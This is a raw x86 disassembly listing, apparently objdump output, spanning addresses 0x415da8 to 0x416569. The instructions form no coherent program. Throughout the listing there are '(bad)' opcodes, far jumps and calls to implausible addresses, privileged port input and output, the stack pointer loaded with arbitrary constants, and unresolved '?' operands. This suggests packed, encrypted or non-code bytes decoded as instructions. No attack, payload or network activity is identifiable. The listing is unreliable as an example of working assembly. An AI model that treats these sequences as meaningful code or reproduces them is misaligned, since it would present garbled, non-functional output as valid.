  415da8:	pop    edx
  415da9:	xor    DWORD PTR [ebx+0x5b],ecx
  415dac:	mov    ah,0xeb
  415dae:	in     al,dx
  415daf:	pop    ss
  415db0:	mov    al,0xad
  415db2:	mov    ds:0xdd82415a,al
  415db7:	mov    dl,0xff
  415db9:	adc    eax,0x10291865
  415dbe:	xchg   dh,cl
  415dc0:	and    BYTE PTR [ecx+0x34],dl
  415dc3:	mov    dl,BYTE PTR [esp+eax*8+0x0]
  415dc7:	mov    esp,0xd7b4ac3c
  415dcc:	inc    eax
  415dcd:	xor    DWORD PTR [edx-0x40f58559],0x3
  415dd4:	jns    0x415e1c
  415dd6:	pop    es
  415dd7:	call   FWORD PTR [esi]
  415dd9:	jmp    0x406c1586
  415dde:	push   edx
  415ddf:	out    0xc5,eax
  415de1:	inc    ebx
  415de2:	sub    eax,esi
  415de4:	aaa    
  415de5:	xchg   ecx,eax
  415de6:	mov    ebp,0xe5ce9853
  415deb:	scas   eax,DWORD PTR es:[edi]
  415dec:	sbb    bl,BYTE PTR [eax]
  415dee:	ins    BYTE PTR es:[edi],dx
  415def:	(bad)  
  415df0:	push   ebx
  415df1:	sbb    BYTE PTR [edi-0x4e1482f1],0x8
  415df8:	outs   dx,BYTE PTR ds:[si]
  415dfa:	ja     0x415e74
  415dfc:	or     esp,DWORD PTR ds:0xf15b8ec0
  415e02:	sbb    BYTE PTR [ecx-0x36d40fbb],cl
  415e08:	mov    eax,DWORD PTR [ebp+0x8]
  415e0b:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  415e12:	jmp    0x416324
  415e17:	cmp    al,0xd2
  415e19:	retf   
  415e1a:	rcr    ecx,0xd9
  415e1d:	retf   0x8d1
  415e20:	iret   
  415e21:	adc    eax,0x5ca00025
  415e26:	(bad)  
  415e27:	std    
  415e28:	cmp    BYTE PTR [edi+0x78],bh
  415e2b:	jae    0x415ea9
  415e2d:	js     0x415ea7
  415e2f:	or     dh,BYTE PTR [ebx+eax*2-0xe80c7b0]
  415e36:	popf   
  415e37:	in     eax,dx
  415e38:	outs   dx,DWORD PTR ds:[esi]
  415e39:	imul   edi,DWORD PTR [edx+0x58],0x528a9137
  415e40:	cmp    edx,DWORD PTR [ebx]
  415e42:	cmp    edx,DWORD PTR [eax-0x35]
  415e45:	scas   eax,DWORD PTR es:[edi]
  415e46:	leave  
  415e47:	stos   DWORD PTR es:[edi],eax
  415e48:	test   eax,0x1916e91c
  415e4d:	xor    ch,ch
  415e4f:	loopne 0x415e7b
  415e51:	xlat   BYTE PTR ds:[ebx]
  415e52:	sbb    dl,BYTE PTR [ebx-0x4c]
  415e55:	sub    ah,ch
  415e57:	lahf   
  415e58:	cmp    al,0xa2
  415e5a:	out    dx,eax
  415e5b:	push   es
  415e5c:	in     eax,0xae
  415e5e:	xor    edi,DWORD PTR [ebx+ebp*8-0x57fb7c3]
  415e65:	or     al,0xa8
  415e67:	jno    0x415e73
  415e69:	retf   0x82bc
  415e6c:	cdq    
  415e6d:	aaa    
  415e6e:	hlt    
  415e6f:	push   es
  415e70:	jge    0x415e81
  415e72:	jns    0x415e3c
  415e74:	xchg   ecx,eax
  415e75:	jae    0x415e54
  415e77:	icebp  
  415e78:	ins    DWORD PTR es:[edi],dx
  415e79:	mov    bl,0x82
  415e7b:	pop    ss
  415e7c:	adc    DWORD PTR [edx+ebx*4-0x10016345],0x52854378
  415e87:	mov    dl,0xd4
  415e89:	pop    edx
  415e8a:	inc    ebx
  415e8b:	(bad)  
  415e8d:	sub    al,0xaf
  415e8f:	(bad)  [ebp-0xd]
  415e92:	pop    ds
  415e93:	loope  0x415eb6
  415e95:	add    bl,BYTE PTR [ecx]
  415e97:	inc    edi
  415e98:	cmp    DWORD PTR [ebx],edi
  415e9a:	inc    edx
  415e9b:	ds js  0x415e3a
  415e9e:	sub    eax,0x3a6c21cb
  415ea3:	mov    cl,0xb2
  415ea5:	cmp    BYTE PTR [edx],ch
  415ea7:	dec    eax
  415ea8:	cmp    esp,DWORD PTR [ebp+0x6cae302b]
  415eae:	xchg   ecx,eax
  415eaf:	push   edx
  415eb0:	lock mov esi,0x938a052f
  415eb6:	cdq    
  415eb7:	cmp    bh,BYTE PTR [edx+0x17]
  415eba:	repnz mov ds:0x2a09f5d3,eax
  415ec0:	xor    BYTE PTR ds:[edx],al
  415ec3:	adc    ecx,DWORD PTR [edi-0x6cc8fd3d]
  415ec9:	jbe    0x415ee2
  415ecb:	imul   edi,DWORD PTR [eax],0xafc43a55
  415ed1:	jl     0x415f05
  415ed3:	mov    al,0xe3
  415ed5:	mov    esi,0x139e8f1
  415eda:	cli    
  415edb:	jle    0x415efe
  415edd:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  415edf:	pop    ebp
  415ee0:	add    BYTE PTR [edi-0x6ad00442],dh
  415ee6:	xchg   edi,eax
  415ee7:	dec    eax
  415ee8:	mov    esp,0xcca4c58c
  415eed:	adc    bh,bh
  415eef:	outs   dx,BYTE PTR ds:[esi]
  415ef0:	dec    ecx
  415ef1:	sti    
  415ef2:	pop    esi
  415ef3:	jg     0x415f00
  415ef5:	inc    ebx
  415ef6:	pop    ebx
  415ef7:	ins    DWORD PTR es:[edi],dx
  415ef8:	loope  0x415f03
  415efa:	jmp    0x415e82
  415efc:	adc    BYTE PTR [esi-0x1365a55b],ch
  415f02:	lock fcom QWORD PTR ds:0xcf478ea1
  415f09:	sbb    eax,0x3d6f3698
  415f0e:	test   BYTE PTR [eax-0x10b010af],0xe6
  415f15:	lds    esi,FWORD PTR [edx-0x49d70e4d]
  415f1b:	inc    esi
  415f1c:	mov    dh,bl
  415f1e:	rcr    ebp,0x53
  415f21:	push   esi
  415f22:	mov    esp,0xa36e7405
  415f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f28:	js     0x415f96
  415f2a:	mov    edi,0xb559d2b1
  415f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f30:	mov    bl,0xbd
  415f32:	sar    ecx,1
  415f34:	mov    esp,0x1897dff2
  415f39:	fnstenv [ebx-0x1c9a633b]
  415f3f:	lods   al,BYTE PTR ds:[esi]
  415f40:	mov    edx,0xcc4b00b7
  415f45:	adc    cl,al
  415f47:	add    BYTE PTR [ecx],bh
  415f49:	xchg   esi,eax
  415f4a:	sub    DWORD PTR [edi],ebx
  415f4c:	ins    DWORD PTR es:[edi],dx
  415f4d:	out    0xae,al
  415f4f:	outs   dx,BYTE PTR ds:[esi]
  415f50:	and    DWORD PTR [ebp+0x7f],edi
  415f53:	imul   esi,DWORD PTR [ecx],0x62
  415f56:	xchg   ebx,eax
  415f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f58:	jb     0x415f58
  415f5a:	xchg   esi,eax
  415f5b:	loope  0x415f7d
  415f5d:	lods   al,BYTE PTR ds:[esi]
  415f5e:	call   0x7f678b5e
  415f63:	dec    ebp
  415f64:	mov    esp,0xef6b619b
  415f69:	push   cs
  415f6a:	push   esp
  415f6b:	in     eax,0x30
  415f6d:	cmc    
  415f6e:	icebp  
  415f6f:	xchg   edx,eax
  415f70:	pop    esp
  415f71:	call   0x8881:0x43c8f13f
  415f78:	push   ebp
  415f79:	pop    esp
  415f7a:	sub    al,0x2e
  415f7c:	shl    BYTE PTR [ecx],cl
  415f7e:	push   edx
  415f7f:	or     eax,0xc62b2248
  415f84:	sbb    BYTE PTR [edi],0x50
  415f87:	xchg   ebp,eax
  415f88:	in     eax,0x68
  415f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8b:	fistp  QWORD PTR [edx+0x24344423]
  415f91:	adc    ecx,ebx
  415f93:	pop    ecx
  415f94:	stos   BYTE PTR es:[edi],al
  415f95:	fisubr WORD PTR [edx-0x1d]
  415f98:	cmp    eax,0xbbad6978
  415f9d:	loopne 0x415fbd
  415f9f:	arpl   WORD PTR [ebx+ecx*1+0x40],bx
  415fa3:	pand   mm2,QWORD PTR [edi+0x62]
  415fa7:	frstor [edx+0x1a]
  415faa:	pop    ebp
  415fab:	mov    dh,BYTE PTR ds:0x5e92d996
  415fb1:	dec    edx
  415fb2:	call   DWORD PTR [ecx]
  415fb4:	mov    dl,dl
  415fb6:	xchg   ebp,eax
  415fb7:	jno    0x416019
  415fb9:	(bad)  
  415fba:	push   esp
  415fbb:	loope  0x41600b
  415fbd:	cmp    al,0x91
  415fbf:	in     eax,0x6a
  415fc1:	add    eax,0xb2f0b542
  415fc6:	clc    
  415fc7:	clc    
  415fc8:	pusha  
  415fc9:	pusha  
  415fca:	popa   
  415fcb:	and    edi,DWORD PTR [esi+0x10]
  415fce:	ins    BYTE PTR es:[edi],dx
  415fcf:	push   esi
  415fd0:	cmp    eax,0x637ac81c
  415fd5:	and    dl,BYTE PTR [ebp+0x1e504fac]
  415fdb:	or     DWORD PTR [esi],edi
  415fdd:	push   ebx
  415fde:	das    
  415fdf:	fwait
  415fe0:	pushf  
  415fe1:	mov    ah,BYTE PTR [esi-0x29e83c5e]
  415fe7:	jp     0x416015
  415fe9:	stc    
  415fea:	jge    0x416061
  415fec:	outs   dx,DWORD PTR ds:[esi]
  415fed:	sti    
  415fee:	fdivr  QWORD PTR [ebx+0x668a68de]
  415ff4:	add    BYTE PTR [edi+0x1b6999c],ah
  415ffa:	xor    al,0x61
  415ffc:	jnp    0x416075
  415ffe:	pop    ebp
  415fff:	pushf  
  416000:	cmp    DWORD PTR [eax+0x76],ebx
  416003:	pop    ds
  416004:	and    DWORD PTR [edi-0x6b],0x7e67f193
  41600b:	dec    edi
  41600c:	sbb    eax,0xcda9034f
  416011:	mov    al,ds:0x10ddeba5
  416016:	std    
  416017:	loopne 0x416069
  416019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41601a:	dec    edx
  41601b:	aas    
  41601c:	jp     0x41601d
  41601e:	js     0x416061
  416020:	ins    BYTE PTR es:[edi],dx
  416021:	out    dx,eax
  416022:	pop    DWORD PTR [ebx+0x6699d744]
  416028:	mov    ebp,DWORD PTR [ebx+0x40d07be2]
  41602e:	jmp    0xd6a2:0x892959e2
  416035:	mov    gs,WORD PTR [edx-0x74]
  416038:	inc    edi
  416039:	sub    eax,0x7480936
  41603e:	jbe    0x416081
  416040:	bound  esi,QWORD PTR [edi+0x400da1a6]
  416046:	sub    al,BYTE PTR [edi-0x1b]
  416049:	addr16 sahf 
  41604b:	xchg   edx,eax
  41604c:	fadd   QWORD PTR [ebx+0x26]
  41604f:	lahf   
  416050:	repnz mov gs:0x98912127,eax
  416057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416058:	pop    ecx
  416059:	mov    al,ds:0xb57bcfe4
  41605e:	pop    eax
  41605f:	test   al,0x1f
  416061:	into   
  416062:	(bad)  
  416063:	cli    
  416064:	mov    ds:0x3a72f2bf,eax
  416069:	stos   DWORD PTR es:[edi],eax
  41606a:	out    0x47,al
  41606c:	push   esp
  41606d:	out    dx,eax
  41606e:	and    eax,0x816d5f4e
  416073:	gs adc al,0x25
  416076:	and    edx,DWORD PTR [esi]
  416078:	lds    edi,FWORD PTR [ebx]
  41607a:	pop    edx
  41607b:	jmp    DWORD PTR [ecx]
  41607d:	mov    bh,cl
  41607f:	cmp    eax,0x79a0c9f5
  416084:	mov    bl,0xfe
  416086:	dec    eax
  416087:	in     al,dx
  416088:	xchg   ebx,eax
  416089:	or     al,0xa7
  41608b:	jne    0x4160a0
  41608d:	sub    edx,DWORD PTR [ebx+ebx*8+0x4]
  416091:	adc    BYTE PTR [edx],dh
  416093:	adc    ch,BYTE PTR [ebx+ebx*4-0xe]
  416097:	shl    DWORD PTR [eax],cl
  416099:	out    dx,al
  41609a:	loope  0x4160a7
  41609c:	cmp    al,0x68
  41609e:	inc    ebx
  41609f:	sub    al,0x1a
  4160a1:	add    al,BYTE PTR [esi+0x6d]
  4160a4:	jae    0x4160a1
  4160a6:	data16 sahf 
  4160a8:	cmp    eax,0xf658894
  4160ad:	aad    0x1a
  4160af:	movaps xmm0,XMMWORD PTR [ebp+0x1fadc339]
  4160b6:	std    
  4160b7:	sti    
  4160b8:	shr    BYTE PTR [eax-0x5d],cl
  4160bb:	jmp    0x50d8a694
  4160c0:	fild   QWORD PTR ds:0xdc8c43be
  4160c6:	(bad)  
  4160c7:	mov    bh,dl
  4160c9:	mov    DWORD PTR fs:[edi-0x79],ecx
  4160cd:	xchg   esi,eax
  4160ce:	pop    esi
  4160cf:	ficom  WORD PTR [esi-0x7b89fd68]
  4160d5:	out    dx,al
  4160d6:	(bad)  
  4160d7:	out    dx,al
  4160d8:	mov    ecx,0x6a42167b
  4160dd:	dec    esp
  4160de:	pop    esp
  4160df:	aaa    
  4160e0:	lds    ebp,FWORD PTR [ebp+ebx*4+0x714dd708]
  4160e7:	sbb    al,0xe7
  4160e9:	or     DWORD PTR [eax-0x46e28f34],edi
  4160ef:	xchg   BYTE PTR [eax],dh
  4160f1:	xchg   ebp,eax
  4160f2:	imul   edx,DWORD PTR [eax+0x7f950fc9],0x56
  4160f9:	js     0x416130
  4160fb:	repz ror BYTE PTR ds:0x7108e33c,1
  416102:	dec    edi
  416103:	scas   eax,DWORD PTR es:[edi]
  416104:	add    BYTE PTR [edx-0x33],0x8e
  416108:	xchg   esp,eax
  416109:	sbb    eax,0xcb4e85d6
  41610e:	mov    cl,0x42
  416110:	xor    al,0x9e
  416112:	dec    esi
  416113:	adc    ecx,ebx
  416115:	test   al,0x5a
  416117:	pop    es
  416118:	inc    edx
  416119:	mov    ecx,0xe7fd59f1
  41611e:	stc    
  41611f:	dec    ebp
  416120:	sbb    bh,cl
  416122:	enter  0x6f16,0xeb
  416126:	add    BYTE PTR [ebp+0x7e],bl
  416129:	fidiv  DWORD PTR [ecx]
  41612b:	mov    cl,0x4a
  41612d:	icebp  
  41612e:	cmc    
  41612f:	in     al,0xac
  416131:	inc    ebp
  416132:	inc    esi
  416133:	mov    dl,0x5c
  416135:	push   esi
  416136:	scas   al,BYTE PTR es:[edi]
  416137:	sub    eax,0x55457840
  41613c:	sub    eax,0xbfba016e
  416141:	sti    
  416142:	idiv   edx
  416144:	(bad)  
  416145:	repnz and al,0xe9
  416148:	rcl    BYTE PTR [edx+0x5d],0x0
  41614c:	pop    ds
  41614d:	fs xchg ebp,eax
  41614f:	jecxz  0x4160d4
  416151:	lods   al,BYTE PTR ds:[esi]
  416152:	inc    edx
  416153:	adc    ch,dh
  416155:	pop    ds
  416156:	loopne 0x4160df
  416158:	xor    eax,0x3882d25f
  41615d:	xor    eax,0x75d69d23
  416162:	cmp    al,0xde
  416164:	push   edi
  416165:	(bad)  
  416166:	js     0x41610d
  416168:	push   esi
  416169:	push   es
  41616a:	mov    ebp,0x71cf38f3
  41616f:	sar    edx,1
  416171:	inc    ebp
  416172:	dec    edx
  416173:	cmp    ch,bh
  416175:	mov    esp,DWORD PTR [esi+0x79b42673]
  41617b:	shr    DWORD PTR [esi-0x5d],cl
  41617e:	mov    dl,0x1
  416180:	cwde   
  416181:	es ja  0x4161c1
  416184:	sub    eax,DWORD PTR [eax+0x23]
  416187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416188:	pop    esp
  416189:	aam    0xf1
  41618b:	mov    cl,0xfe
  41618d:	pop    esp
  41618e:	outs   dx,BYTE PTR ds:[esi]
  41618f:	jne    0x416147
  416191:	adc    bh,bl
  416193:	adc    edi,ebp
  416195:	dec    eax
  416196:	pop    edi
  416197:	scas   eax,DWORD PTR es:[edi]
  416198:	mov    ds:0xc1b75f97,al
  41619d:	mov    eax,ebx
  41619f:	inc    edi
  4161a0:	sar    BYTE PTR [edi+0x19],cl
  4161a3:	pop    esp
  4161a4:	dec    edi
  4161a5:	data16 clc 
  4161a7:	lods   al,BYTE PTR ds:[esi]
  4161a8:	sar    DWORD PTR [edx-0x617d05e0],1
  4161ae:	xchg   DWORD PTR [edi-0x742af88c],edx
  4161b4:	retf   0xfddf
  4161b7:	cmp    bh,cl
  4161b9:	adc    esp,DWORD PTR [ebp+ecx*4-0x3e]
  4161bd:	adc    eax,DWORD PTR [eax-0x3f2c0ac8]
  4161c3:	xor    eax,eax
  4161c5:	cmp    eax,0x5b99f904
  4161ca:	int    0x86
  4161cc:	and    cx,WORD PTR [ebx-0x57]
  4161d0:	test   eax,0x382247c4
  4161d5:	daa    
  4161d6:	pushf  
  4161d7:	jbe    0x416203
  4161d9:	test   eax,0x3b57b953
  4161de:	outs   dx,BYTE PTR fs:[esi]
  4161e0:	sbb    ah,BYTE PTR [edi]
  4161e2:	jo     0x416174
  4161e4:	sub    DWORD PTR [edi+0x32],edx
  4161e7:	cwde   
  4161e8:	(bad)  
  4161e9:	in     al,0x78
  4161eb:	xor    BYTE PTR [ebx-0x46],dl
  4161ee:	mov    dh,0x65
  4161f0:	sub    dh,BYTE PTR [ecx+0x7b]
  4161f3:	call   0x388e:0xcdb52423
  4161fa:	out    dx,al
  4161fb:	in     al,0x30
  4161fd:	int3   
  4161fe:	dec    edi
  4161ff:	out    0x4a,eax
  416201:	mov    al,0x7
  416203:	mov    ecx,0xdbac947e
  416208:	dec    esi
  416209:	dec    esi
  41620a:	aaa    
  41620b:	xor    ebp,DWORD PTR [ebx+0xe57bd82]
  416211:	mov    ds:0xaa7d1293,al
  416216:	sahf   
  416217:	and    ch,BYTE PTR [esi]
  416219:	adc    al,0xf4
  41621b:	(bad)  
  41621c:	mov    bh,0xab
  41621e:	aas    
  41621f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416220:	adc    al,0xf0
  416222:	mov    bh,0x88
  416224:	xchg   ebp,eax
  416225:	mov    ss,WORD PTR [edx+0x2b]
  416228:	jecxz  0x4162a9
  41622a:	xor    DWORD PTR [ebp-0x66656712],edi
  416230:	jp     0x4161fa
  416232:	jne    0x416269
  416234:	jne    0x4162af
  416236:	or     al,0xf9
  416238:	pop    esp
  416239:	ja     0x416280
  41623b:	(bad)
  41623f:	imul   ebp,DWORD PTR [edi],0x33
  416242:	and    al,0xbd
  416244:	inc    edi
  416245:	sub    al,0x59
  416247:	dec    ecx
  416248:	cdq    
  416249:	pop    edx
  41624a:	fistp  WORD PTR [edi-0x5c4d82e2]
  416250:	add    al,BYTE PTR ds:0x85e9fb5
  416256:	xchg   edx,eax
  416257:	and    edi,DWORD PTR [esi-0x58fa7b81]
  41625d:	cmp    ah,BYTE PTR [edx-0x29]
  416260:	rcr    BYTE PTR [edx-0x42],0x4c
  416264:	loop   0x416230
  416266:	xor    DWORD PTR [edi],eax
  416268:	pop    ss
  416269:	out    0x1e,eax
  41626b:	or     DWORD PTR [edx-0x36],0x8147674b
  416272:	push   0x2e
  416274:	clc    
  416275:	jne    0x4162d3
  416277:	das    
  416278:	push   ebx
  416279:	inc    ebp
  41627a:	imul   ebp,eax,0x6d
  41627d:	in     al,0x56
  41627f:	int3   
  416280:	or     al,0xc
  416282:	pop    ebx
  416283:	ja     0x4162bf
  416285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416286:	dec    eax
  416287:	or     DWORD PTR [edx-0x39],0xffffff88
  41628b:	or     cl,BYTE PTR [edi]
  41628d:	shl    BYTE PTR [ebx+0x38320825],cl
  416293:	enter  0x86,0xc5
  416297:	mov    ds:0xf9734404,eax
  41629c:	add    BYTE PTR [esi+0x6b],dl
  41629f:	mov    dl,0x68
  4162a1:	mov    bl,0x91
  4162a3:	jp     0x416290
  4162a5:	dec    edx
  4162a6:	leave  
  4162a7:	push   ss
  4162a8:	mov    DWORD PTR [ecx-0x1176c858],eax
  4162ae:	xchg   ebp,eax
  4162af:	push   0x16
  4162b1:	mov    esp,0x72f28edd
  4162b6:	scas   al,BYTE PTR es:[edi]
  4162b7:	stc    
  4162b8:	or     ecx,DWORD PTR ds:0xa25316be
  4162be:	jmp    0x2ba8:0x742a929c
  4162c5:	fwait
  4162c6:	daa    
  4162c7:	pop    ss
  4162c8:	add    DWORD PTR [esp+ebx*1+0x76852ad2],ebp
  4162cf:	adc    ebp,DWORD PTR [edx+0x11]
  4162d2:	movsx  esp,al
  4162d5:	or     BYTE PTR [eax-0x77],0x2d
  4162d9:	lock or eax,0xb5065cb2
  4162df:	cmp    eax,0x9c7e3b3
  4162e4:	shl    edi,cl
  4162e6:	mov    ebp,0x91d7cca7
  4162eb:	in     eax,dx
  4162ec:	daa    
  4162ed:	adc    ebx,eax
  4162ef:	xor    eax,DWORD PTR [ebx-0x4a]
  4162f2:	gs (bad) 
  4162f4:	rcr    BYTE PTR ss:[edi-0x72],0xf2
  4162f9:	mov    bh,0xe6
  4162fb:	xlat   BYTE PTR ds:[ebx]
  4162fc:	cwde   
  4162fd:	cld    
  4162fe:	(bad)  
  4162ff:	xlat   BYTE PTR ds:[ebx]
  416300:	jecxz  0x416335
  416302:	add    DWORD PTR [ebx+0x2277c016],0x483e7e5f
  41630c:	adc    DWORD PTR [esi],esi
  41630e:	jge    0x4162a9
  416310:	and    eax,0x5923d4bf
  416315:	push   0xfffffff6
  416317:	bound  ebp,QWORD PTR [ebp-0x76]
  41631a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41631b:	jge    0x416317
  41631d:	stos   BYTE PTR es:[edi],al
  41631e:	pop    es
  41631f:	inc    esp
  416320:	pop    ecx
  416321:	int    0x13
  416323:	jb     0x4162ec
  416325:	inc    ebp
  416326:	loopne 0x416361
  416328:	test   DWORD PTR [eax+edi*8-0x5d22ea75],ebx
  41632f:	inc    edx
  416330:	add    BYTE PTR [ecx],dh
  416332:	adc    eax,0x42a3bd
  416337:	jmp    0x416849
  41633c:	aas    
  41633d:	enter  0xc7c2,0xd1
  416341:	fxch   st(1)
  416343:	rcl    BYTE PTR [eax],1
  416345:	fistp  DWORD PTR [edi+0x42ee4cfe]
  41634b:	ja     0x41633d
  41634d:	ret    
  41634e:	jg     0x4163c8
  416350:	jae    0x4163ce
  416352:	js     0x4163cc
  416354:	inc    edi
  416355:	ret    
  416356:	jnp    0x416398
  416358:	xchg   esi,eax
  416359:	jnp    0x416336
  41635b:	mov    ch,0xae
  41635d:	loope  0x416394
  41635f:	leave  
  416360:	sub    BYTE PTR [ebp+0x1],bl
  416363:	push   0x8c7b8928
  416368:	inc    edi
  416369:	leave  
  41636a:	mov    ds:0x870a541f,eax
  41636f:	mov    dl,0x9f
  416371:	jmp    0x79eb:0xa87f2629
  416378:	push   ebx
  416379:	fcomi  st,st(6)
  41637b:	mov    DWORD PTR [esp+ecx*8],ecx
  41637e:	cwde   
  41637f:	sbb    eax,0x580689be
  416384:	push   ebp
  416385:	(bad)  
  416386:	in     al,0xd2
  416388:	xchg   ecx,eax
  416389:	nop
  41638a:	fs pop esp
  41638c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41638d:	sub    dl,al
  41638f:	jmp    0xb758e857
  416394:	stc    
  416395:	inc    ebx
  416396:	shl    BYTE PTR [eax-0x229042b],0x47
  41639d:	lahf   
  41639e:	and    al,0x6f
  4163a0:	test   eax,0xafec3124
  4163a5:	sub    al,0x7e
  4163a7:	shl    cl,cl
  4163a9:	pop    esp
  4163aa:	jb     0x416417
  4163ac:	cli    
  4163ad:	in     al,dx
  4163ae:	mov    edi,0xea230e01
  4163b3:	(bad)  
  4163b4:	or     DWORD PTR [edx-0x14c94093],esp
  4163ba:	inc    esp
  4163bb:	lods   al,BYTE PTR ds:[esi]
  4163bc:	shr    esi,1
  4163be:	jne    0x416428
  4163c0:	xor    eax,0x9dde7dfb
  4163c5:	and    ah,BYTE PTR [ebp-0x6c6c32c1]
  4163cb:	cmc    
  4163cc:	xor    al,0x8
  4163ce:	jnp    0x416416
  4163d0:	fist   WORD PTR [edx]
  4163d2:	ins    BYTE PTR es:[edi],dx
  4163d3:	sub    al,0x2b
  4163d5:	dec    edi
  4163d6:	in     al,0xe3
  4163d8:	mov    ecx,0xddd9d7a9
  4163dd:	inc    edx
  4163de:	pop    edi
  4163df:	mov    ch,0x59
  4163e1:	add    al,0xb3
  4163e4:	add    eax,0x942a2108
  4163e9:	push   ss
  4163ea:	or     ebp,DWORD PTR [edi]
  4163ec:	jge    0x416401
  4163ee:	add    ch,BYTE PTR [ecx-0x273fb116]
  4163f4:	jecxz  0x416418
  4163f6:	mov    cl,0xf9
  4163f8:	sub    DWORD PTR [esi],ecx
  4163fa:	int3   
  4163fb:	dec    edx
  4163fc:	push   esp
  4163fd:	mov    ?,WORD PTR ds:0xc08f70ae
  416403:	(bad)
  416406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416407:	or     ch,BYTE PTR [ebp+0x22]
  41640a:	es sbb ebp,esi
  41640d:	mov    esp,0x282cf34b
  416412:	inc    eax
  416413:	xor    eax,DWORD PTR [esi-0x71]
  416416:	shl    ecx,0xeb
  416419:	int    0x3a
  41641b:	fcomp  QWORD PTR [ebp-0x5]
  41641e:	fimul  WORD PTR [ebx]
  416420:	dec    eax
  416421:	adc    ebx,ebx
  416423:	inc    ebp
  416424:	ja     0x416467
  416426:	mov    dl,0x66
  416428:	icebp  
  416429:	(bad)  
  41642a:	push   ds
  41642b:	hlt    
  41642c:	fs enter 0x6365,0xa8
  416431:	xor    dh,BYTE PTR [ebx+0x50]
  416434:	scas   eax,DWORD PTR es:[edi]
  416435:	add    dl,ah
  416437:	cmp    edi,DWORD PTR [ebx]
  416439:	cmp    al,0x7
  41643b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643c:	loope  0x416493
  41643e:	stos   DWORD PTR es:[edi],eax
  41643f:	fmulp  st(2),st
  416441:	sbb    dh,BYTE PTR [ecx+0x28494311]
  416447:	sub    DWORD PTR [edi],ebx
  416449:	fs mov al,0xc
  41644c:	call   0x2f29dfe8
  416451:	jmp    0xc26:0x41187d80
  416458:	mov    bl,0xfc
  41645a:	cmc    
  41645b:	push   0xe438eb6d
  416460:	mov    dl,0x50
  416462:	aaa    
  416463:	test   eax,0xfcdbdf4
  416468:	loope  0x4163ee
  41646a:	cwde   
  41646b:	lods   al,BYTE PTR ds:[esi]
  41646c:	cmc    
  41646d:	jb     0x416437
  41646f:	mov    ecx,0x33afe264
  416474:	adc    ebp,DWORD PTR [esi+0x75]
  416477:	dec    ecx
  416478:	cmp    BYTE PTR [esi+0x5d],al
  41647b:	rcr    BYTE PTR [edx+0x73d8f545],cl
  416481:	in     eax,dx
  416482:	jl     0x41648d
  416484:	and    al,0x84
  416486:	test   al,0xae
  416488:	sbb    BYTE PTR [di+0x43],dh
  41648c:	mov    edi,0xbd2b443
  416491:	add    BYTE PTR [ebx-0x22],0x4a
  416495:	xchg   ebp,eax
  416496:	mov    BYTE PTR [ebx-0x3c],ah
  416499:	jg     0x4164dc
  41649b:	lahf   
  41649c:	push   edx
  41649d:	stos   DWORD PTR es:[edi],eax
  41649e:	pop    edx
  41649f:	sub    ecx,edx
  4164a1:	and    DWORD PTR [bx+di],esi
  4164a4:	pop    ebx
  4164a5:	jbe    0x41642a
  4164a7:	test   eax,0xfd6e6a3a
  4164ac:	aaa    
  4164ad:	outs   dx,DWORD PTR ds:[esi]
  4164ae:	fldln2 
  4164b0:	mov    ah,0xb0
  4164b2:	mov    edi,0x5e8de792
  4164b7:	inc    edi
  4164b8:	or     eax,0x4f430f8c
  4164bd:	repz jmp 0xe623:0xb11e985c
  4164c5:	lea    ebp,[edi-0xf]
  4164c8:	loop   0x416509
  4164ca:	shr    ah,1
  4164cc:	repz mov ?,WORD PTR [esi+edi*1]
  4164d0:	mov    ?,WORD PTR [edx+0x1523775e]
  4164d6:	add    dl,BYTE PTR [eax]
  4164d8:	xchg   BYTE PTR [edi+0x65],al
  4164db:	jbe    0x416478
  4164dd:	enter  0x69a7,0x25
  4164e1:	pusha  
  4164e2:	call   0x4dd3955e
  4164e7:	imul   edi,DWORD PTR [esi],0xffffffe3
  4164ea:	inc    edi
  4164eb:	sub    eax,0x26ad9d48
  4164f0:	push   0xffffffbf
  4164f2:	push   cs
  4164f3:	out    dx,al
  4164f4:	pop    edi
  4164f5:	jb     0x416537
  4164f7:	fdivr  DWORD PTR [ecx-0x5f]
  4164fa:	xchg   DWORD PTR [edx-0x58],eax
  4164fd:	fcmovnb st,st(1)
  4164ff:	xor    ebp,DWORD PTR [ebx-0x25]
  416502:	adc    esi,eax
  416504:	stos   DWORD PTR es:[edi],eax
  416505:	rcl    eax,1
  416507:	icebp  
  416508:	lds    esp,FWORD PTR [ebx-0x366511ba]
  41650e:	sbb    al,BYTE PTR [ecx+0x757dc585]
  416514:	cmp    BYTE PTR [ebp+0x10c844f2],ch
  41651a:	retf   
  41651b:	xor    edi,DWORD PTR [edi-0x78908de6]
  416521:	cmp    ch,BYTE PTR ss:[ebp-0x78]
  416525:	icebp  
  416526:	push   ebx
  416527:	icebp  
  416528:	push   ss
  416529:	pushf  
  41652a:	popf   
  41652b:	and    esp,ebx
  41652d:	ret    
  41652e:	jp     0x416596
  416530:	dec    edx
  416531:	cmp    eax,0xebe4673e
  416536:	jno    0x41659d
  416538:	cmp    DWORD PTR [edx],edx
  41653a:	mov    DWORD PTR [edi-0x7daa03be],edi
  416540:	ins    BYTE PTR es:[edi],dx
  416541:	cmp    esp,esi
  416543:	mov    ds:0x58642b1f,al
  416548:	push   ebx
  41654a:	pop    esp
  41654b:	inc    ecx
  41654c:	mov    ebx,0x4b0627d
  416551:	repnz imul esp,esi,0xf5fbf2fc
  416558:	add    dl,BYTE PTR [ecx+0x22]
  41655b:	mov    dl,0xc0
  41655d:	rcl    BYTE PTR [ebp+esi*1-0xe2625bc],cl
  416564:	lds    ebp,FWORD PTR [ebx]
  416566:	sub    esi,DWORD PTR [eax]
  416568:	xchg   edi,eax
  416569:	enter  0x15d3,0x9c
